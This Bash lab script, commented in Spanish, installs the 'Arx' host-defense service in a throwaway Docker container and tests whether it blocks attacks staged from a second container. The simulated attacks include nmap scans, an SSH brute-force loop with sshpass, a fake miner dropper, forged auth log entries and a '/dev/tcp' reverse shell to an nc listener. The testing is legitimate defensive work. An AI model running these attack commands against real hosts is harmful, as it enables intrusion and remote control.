#!/usr/bin/env bash
# Lab con systemd de verdad: instala el .deb, corre Arx como servicio y mide desde el atacante.
# Cubre lo que el mini-lab no puede: el unit y su endurecimiento, journald, reinicios y ufw activo.
#   bash lab/systemd-lab.sh
# Todo es efímero. No sustituye a una VM: comparte kernel con Docker, sin auditd y sin reinicio real
# del kernel (un `docker restart` borra nftables como un reinicio, pero no el resto).
set -uo pipefail
cd "$(dirname "$0")/.."

SUF=$$
NET=arxsd-$SUF
VIC=arxsdv-$SUF
ATT=arxsda-$SUF
WORD=palabra-lab
FAILED=0
cleanup() {
  docker stop -t 2 "$VIC" "$ATT" >/dev/null 2>&1 || true
  docker network rm "$NET" >/dev/null 2>&1 || true
}
trap cleanup EXIT

step() { echo; echo "══ $1 ══"; }
pass() { echo "[PASS] $1"; }
fail() { echo "[FAIL] $1"; FAILED=1; }
v() { docker exec "$VIC" "$@"; }
a() { docker exec "$ATT" "$@"; }
# check "<descripción>" <comando...>: PASS si el comando acaba en 0
check() { local d="$1"; shift; if "$@"; then pass "$d"; else fail "$d"; fi; }
# wait_for <segundos> <comando...>
wait_for() { local n="$1"; shift; local i; for i in $(seq "$n"); do "$@" && return 0; sleep 1; done; return 1; }
# Las autorizaciones reciben la palabra por stdin: es lo que hace getpass sin terminal.
word() { echo "$WORD" | docker exec -i "$VIC" arx "$@" 2>/dev/null; }

reaches() { a nc -z -w 3 victim "$1" 2>/dev/null; }
# Arx corre como root con el .deb: un trozo de Python con su mismo código
vpy() { docker exec -i "$VIC" python3 -c "import sys; sys.path.insert(0, '/usr/lib/arx/arx.pyz'); $1"; }
# Libera lo que caduca, como si hubiera pasado la hora (la cuenta no caduca)
release() {
  vpy "from datetime import datetime, timedelta, timezone as t
from arx.modules import response as r
r.expire_blocks(now=datetime.now(t.utc) + timedelta(minutes=61))"
}
# Pizarra limpia entre escenarios: si no, el freno y "reaparece → decide tú" los mezclan
slate() {
  release
  vpy "from arx import config
from arx.modules import response as r
for path in (r._findings_path(), r._blocks_path(), r._actions_path(), r._pending_path()):
    config.write_json(path, {} if 'findings' in path.name else [])"
  v nft flush set inet arx scan4 2>/dev/null || true
  v nft flush set inet arx block_ipv4 2>/dev/null || true
}
in_block_set() { v nft list set inet arx block_ipv4 2>/dev/null | grep -q "$1"; }
scan_clean() { v nft flush set inet arx scan4 2>/dev/null || true; }

step "contenedores"
docker build -q -t arx-lab-systemd lab/systemd >/dev/null || exit 1
docker network create "$NET" >/dev/null
docker run -d --rm --name "$VIC" --privileged --cgroupns=host --pids-limit 4000 --memory 3g \
  --network "$NET" --network-alias victim \
  -v /sys/fs/cgroup:/sys/fs/cgroup:rw --tmpfs /run --tmpfs /run/lock \
  -v "$PWD":/src:ro arx-lab-systemd >/dev/null
docker run -d --rm --name "$ATT" --network "$NET" --network-alias attacker ubuntu:22.04 bash -c '
  export DEBIAN_FRONTEND=noninteractive
  apt-get update -qq >/dev/null 2>&1
  apt-get install -y -qq nmap netcat-openbsd sshpass curl procps >/dev/null 2>&1
  mkfifo /tmp/c2in
  (tail -f /tmp/c2in | nc -lk 4444 >/tmp/c2out 2>&1) &
  touch /ready; sleep infinity' >/dev/null
wait_for 180 a test -f /ready || { echo "el atacante no arrancó"; exit 1; }
wait_for 60 bash -c "docker exec $VIC systemctl is-system-running 2>/dev/null | grep -qE 'running|degraded'"
ATTACKER_IP=$(v python3 -c "import socket; print(socket.gethostbyname('attacker'))")
echo "atacante: $ATTACKER_IP · pid 1: $(v cat /proc/1/comm)"
# sshd admite contraseña y root tiene una: es la "otra cuenta de administración" que debe quedar
v bash -c 'echo root:arxlab | chpasswd; sed -i "s/^#\?PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config; systemctl restart ssh
  useradd -m -s /bin/bash bob; echo bob:clave-bob | chpasswd
  for p in 9001 9002 9003 9004 9005 9006 9007 9008 9009 9010; do systemd-run --quiet --unit=senuelo-$p nc -k -l $p; done'

step "instalación real: .deb, setup por consola, recon, learn, seal, servicio"
v bash -c 'rm -rf /build && mkdir /build && cp -r /src/src /src/packaging /build/ && cd /build && packaging/build-deb.sh 2>&1 | tail -1 && dpkg -i dist/arx_all.deb >/dev/null'
check "el paquete instala arx" v arx --version
# Sin proveedores LLM: claves vacías. Respuestas en el orden del asistente.
printf '%s\n' "" "" "" "$WORD" "$WORD" "" "" "1" "" "core" "" "" "high" "block" \
  | docker exec -i "$VIC" arx setup >/dev/null 2>&1
check "arx setup deja la configuración" v test -s /etc/arx/config.json
v arx recon >/dev/null; v arx learn >/dev/null; v arx learn >/dev/null
v arx learn --seal | tail -3
v arx canaries plant >/dev/null
v arx service install --enforce | tail -1
check "el servicio queda activo" wait_for 10 v systemctl is-active -q arx
check "el unit lleva --enforce" v grep -q -- "guard --enforce" /etc/systemd/system/arx.service

step "journald: lo que dice el servicio se puede leer al momento"
check "el arranque aparece en el journal" wait_for 15 bash -c "docker exec $VIC journalctl -u arx --no-pager -q | grep -q 'en guardia'"

step "Restart=always: morir no deja el host sin guardia"
PID=$(v systemctl show -p MainPID --value arx)
v kill -9 "$PID"
check "vuelve tras kill -9" wait_for 25 bash -c "p=\$(docker exec $VIC systemctl show -p MainPID --value arx); [ \"\$p\" != 0 ] && [ \"\$p\" != $PID ]"

step "el servicio endurecido actúa de verdad: escaneo real"
a nmap -sS -p 9000-9020 --max-retries 1 victim >/dev/null 2>&1
if wait_for 70 in_block_set "$ATTACKER_IP"; then pass "IP bloqueada por el servicio"; else fail "IP bloqueada por el servicio"; fi
if reaches 22; then fail "el atacante ya no llega al SSH"; else pass "el atacante ya no llega al SSH"; fi
check "al momento lo explica en el journal" bash -c "docker exec $VIC journalctl -u arx --no-pager -q | grep -q 'escaneo desde'"
slate

step "el servicio endurecido suspende un dropper en /tmp y en /home"
v bash -c 'cp /usr/bin/yes /tmp/minero; chmod +x /tmp/minero; systemd-run --quiet --unit=dropper1 --property=StandardOutput=null /tmp/minero
  cp /usr/bin/yes /home/bob/minero; chown bob: /home/bob/minero; chmod +x /home/bob/minero; systemd-run --quiet --uid=bob --unit=dropper2 --property=StandardOutput=null /home/bob/minero'
if wait_for 70 bash -c "docker exec $VIC sh -c 'ps -o stat= -p \$(pgrep -f ^/tmp/minero | head -1)' 2>/dev/null | grep -q T"; then pass "dropper en /tmp suspendido"; else fail "dropper en /tmp suspendido"; fi
if wait_for 40 bash -c "docker exec $VIC sh -c 'ps -o stat= -p \$(pgrep -f ^/home/bob/minero | head -1)' 2>/dev/null | grep -q T"; then pass "dropper en /home suspendido"; else fail "dropper en /home suspendido"; fi
v systemctl stop dropper1 dropper2 2>/dev/null
slate

step "acceso real con terminal: se detecta con who, y tú decides con tu palabra"
docker exec -d "$ATT" sshpass -p clave-bob ssh -tt -o StrictHostKeyChecking=no bob@victim "sleep 900"
PEND=""
find_pending() { PEND=$(docker exec "$VIC" arx authorize 2>/dev/null | grep -E '^\s+[0-9a-f]{6}\s' | grep "bob@$ATTACKER_IP" | awk '{print $1}' | head -1); [ -n "$PEND" ]; }
if wait_for 70 find_pending; then pass "acceso desconocido en pendientes ($PEND)"; else fail "acceso desconocido en pendientes"; fi
v who | sed 's/^/  who: /'
if [ -n "$PEND" ]; then
  word authorize "$PEND" | sed 's/^/  /'
  if a pgrep -f "ssh.*bob@victim" >/dev/null; then fail "la sesión del atacante se cerró"; else pass "la sesión del atacante se cerró"; fi
  release
  if a sshpass -p clave-bob ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 bob@victim true 2>/dev/null; then
    fail "la contraseña robada sigue sin entrar"; else pass "la contraseña robada sigue sin entrar"; fi
  v arx status | grep -E "cuentas bloq" | sed 's/^/  /'
  word unlock bob | sed 's/^/  /'
  check "tras arx unlock vuelve a entrar" a sshpass -p clave-bob ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 bob@victim true
fi
slate

step "el modelo actúa desde el servicio endurecido (su respuesta se simula; lo demás es real)"
v mkdir -p /etc/systemd/system/arx.service.d
v bash -c 'cat > /etc/systemd/system/arx.service.d/stub.conf <<CONF
[Service]
ExecStart=
ExecStart=/usr/bin/python3 /src/lab/systemd/stub-guard.py
CONF
systemctl daemon-reload; systemctl restart arx'
wait_for 15 v systemctl is-active -q arx
docker exec -d "$ATT" sshpass -p clave-bob ssh -o StrictHostKeyChecking=no bob@victim "sleep 900"
closed() { ! docker exec "$ATT" pgrep -f "ssh.*bob@victim" >/dev/null; }
if wait_for 70 closed; then pass "el servicio cerró solo la sesión sin terminal"; else fail "el servicio cerró solo la sesión sin terminal"; fi
check "la cuenta queda bloqueada" bash -c "docker exec $VIC arx status | grep -q 'cuentas bloq.*bob'"
check "el dueño lo lee en el journal, con el contexto" bash -c "docker exec $VIC journalctl -u arx --no-pager -q | grep -q 'Veredicto del modelo: amenaza'"
word unlock bob | sed 's/^/  /'
v bash -c 'rm -f /etc/systemd/system/arx.service.d/stub.conf; systemctl daemon-reload; systemctl restart arx'
slate

step "sin rsyslog (Debian 12, instalación mínima): la fuerza bruta se sigue viendo, y logger no engaña"
v systemctl stop rsyslog
v rm -f /var/log/auth.log
v systemctl restart arx
sleep 35
for i in 1 2 3 4 5 6 7 8; do
  a sshpass -p "mala-$i" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o ConnectTimeout=3 root@victim true 2>/dev/null || true
done
if wait_for 70 in_block_set "$ATTACKER_IP"; then pass "fuerza bruta detectada solo con journald"; else fail "fuerza bruta detectada solo con journald"; fi
slate
v su nobody -s /bin/sh -c "for i in 1 2 3 4 5 6 7 8; do logger -p auth.info -t 'sshd[1]' 'Failed password for root from 198.51.100.9 port 1 ssh2'; done"
sleep 35
if in_block_set 198.51.100.9; then fail "logger no consigue bloquear una IP inocente"; else pass "logger no consigue bloquear una IP inocente"; fi
v systemctl start rsyslog
slate

step "reinicio: el firewall se vacía, pero la contención debe seguir en pie"
a nmap -sS -p 9000-9020 --max-retries 1 victim >/dev/null 2>&1
wait_for 70 in_block_set "$ATTACKER_IP" || fail "no se llegó a bloquear antes del reinicio"
docker restart -t 3 "$VIC" >/dev/null
wait_for 60 bash -c "docker exec $VIC systemctl is-system-running 2>/dev/null | grep -qE 'running|degraded'"
check "el servicio vuelve solo tras reiniciar" wait_for 30 v systemctl is-active -q arx
if wait_for 45 in_block_set "$ATTACKER_IP"; then pass "el bloqueo sigue vigente tras reiniciar"; else fail "el bloqueo sigue vigente tras reiniciar"; fi
if reaches 22; then fail "tras reiniciar, el atacante sigue fuera"; else pass "tras reiniciar, el atacante sigue fuera"; fi
slate

step "nftables reiniciado: su configuración hace flush de TODO"
a nmap -sS -p 9000-9020 --max-retries 1 victim >/dev/null 2>&1
wait_for 70 in_block_set "$ATTACKER_IP" || fail "no se llegó a bloquear antes de reiniciar nftables"
v systemctl restart nftables
if wait_for 45 in_block_set "$ATTACKER_IP"; then pass "el bloqueo se repone tras el flush"; else fail "el bloqueo se repone tras el flush"; fi
slate
v systemctl stop arx

step "ufw activo con una regla que permite el puerto: ¿el bloqueo corta de verdad?"
v bash -c 'ufw allow 22/tcp >/dev/null; for p in 9001 9002 9003 9004 9005 9006 9007 9008 9009 9010; do ufw allow $p/tcp >/dev/null; done; ufw --force enable >/dev/null'
check "ufw activo y el SSH llega" reaches 22
a nmap -sS -p 9001-9010 --max-retries 1 victim >/dev/null 2>&1
v arx guard --once --enforce >/dev/null 2>&1
v arx status | grep -E "bloqueos" | sed 's/^/  /'
v ufw status numbered | head -6 | sed 's/^/  /'
if reaches 22; then fail "ufw: el atacante bloqueado no llega a un puerto permitido"; else pass "ufw: el atacante bloqueado no llega a un puerto permitido"; fi
release; scan_clean
check "ufw: al expirar vuelve a llegar" wait_for 8 reaches 22
slate

step "ufw activo: un reverse shell se corta igual"
docker exec -d "$VIC" bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
sleep 2
a bash -c "echo 'touch /tmp/c2-antes' > /tmp/c2in"
sleep 1
check "el canal funciona antes" v test -f /tmp/c2-antes
v arx guard --once --enforce >/dev/null 2>&1
a bash -c "echo 'touch /tmp/c2-despues' > /tmp/c2in"
sleep 3
if v test -f /tmp/c2-despues; then fail "ufw: la orden no llega tras cortar el canal"; else pass "ufw: la orden no llega tras cortar el canal"; fi
if v nft list set inet arx c2_out4 2>/dev/null | grep -q "$ATTACKER_IP"; then pass "canal en c2_out4"; else fail "canal en c2_out4"; fi

step "ufw recargado: no debe llevarse por delante la tabla de Arx"
v ufw reload >/dev/null
if v nft list set inet arx c2_out4 2>/dev/null | grep -q "$ATTACKER_IP"; then pass "el canal sigue cortado tras ufw reload"; else fail "el canal sigue cortado tras ufw reload"; fi
slate

step "ufw activo: un puerto nuevo que ufw ya permitía"
v ufw allow 4455/tcp >/dev/null
v bash -c 'systemd-run --quiet --unit=puerto-nuevo nc -k -l 4455'
sleep 1
check "el puerto responde antes" reaches 4455
v arx guard --once --enforce >/dev/null 2>&1
if reaches 4455; then fail "ufw: el puerto nuevo quedó bloqueado"; else pass "ufw: el puerto nuevo quedó bloqueado"; fi
release
check "ufw: al expirar vuelve a responder" wait_for 8 reaches 4455
v systemctl stop puerto-nuevo 2>/dev/null

step "desinstalación"
v arx service uninstall | tail -1
check "sin unit" bash -c "! docker exec $VIC test -e /etc/systemd/system/arx.service"
v apt-get remove -y -qq arx >/dev/null 2>&1
check "paquete retirado" bash -c "! docker exec $VIC which arx >/dev/null"

echo
if [ "$FAILED" = 0 ]; then echo "══ LAB SYSTEMD COMPLETO ══"; else echo "══ LAB SYSTEMD CON FALLOS (ver líneas [FAIL]) ══"; exit 1; fi
